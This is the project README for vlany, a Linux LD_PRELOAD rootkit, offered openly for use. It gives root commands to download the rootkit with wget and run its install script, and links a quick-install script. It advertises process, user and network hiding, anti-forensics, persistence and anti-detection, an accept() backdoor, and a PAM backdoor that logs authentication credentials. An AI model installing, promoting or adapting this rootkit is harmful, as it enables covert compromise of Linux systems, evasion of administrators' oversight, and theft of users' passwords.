#Vlany
###A Linux (LD_PRELOAD) rootkit

##Installing
It's very simple to install vlany onto a sytem as it comes with an automated install script.    
To install vlany you want to first download it from our GitHub ( Always up to date and trusted )  
`root@vlany:~# wget https://github.com/mempodippy/vlany/archive/master.tar.gz && tar xvpfz master.tar.gz`

Once it's downloaded you just have to run `install.sh` inside vlany-master.   
`root@vlany:~# cd vlany-master && ./install.sh`   
By default this will prompt you with a [tui](https://en.wikipedia.org/wiki/Text-based_user_interface) installation but if cli one is prefered you can use --cli argument.

##Downloads
[quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh)</br>
[vlany.tar.gz](https://github.com/mempodippy/vlany/archive/master.tar.gz)</br>


##Features
  * Process hiding
  * User hiding
  * Network hiding
  * LXC container
  * Anti-Debug
  * Anti-Forensics
  * Persistent (re)installation & Anti-Detection
  * Dynamic linker modifications
  * Backdoors
    * accept() backdoor (derived from Jynx2)
    * PAM backdoor
      * PAM auth logger
  * vlany-exclusive commands

##Known bugs
###Serious bugs
> 1. There is currently only one significant bug in vlany, which unfortunately causes the box to be unable to reboot successfully.
> This bug arises from hide_checks.c @ hidden_xattr. It'll get fixed.

###Minor bugs
> 1. There is a [weird bug](https://github.com/mempodippy/vlany/issues/4) where it shows a duplicate line in the w / who commands. This is potentially a way to detect a vlany installation on a box.

##[In-depth README.txt](https://raw.githubusercontent.com/mempodippy/vlany/master/README) (very detailed but not maintained)</br>
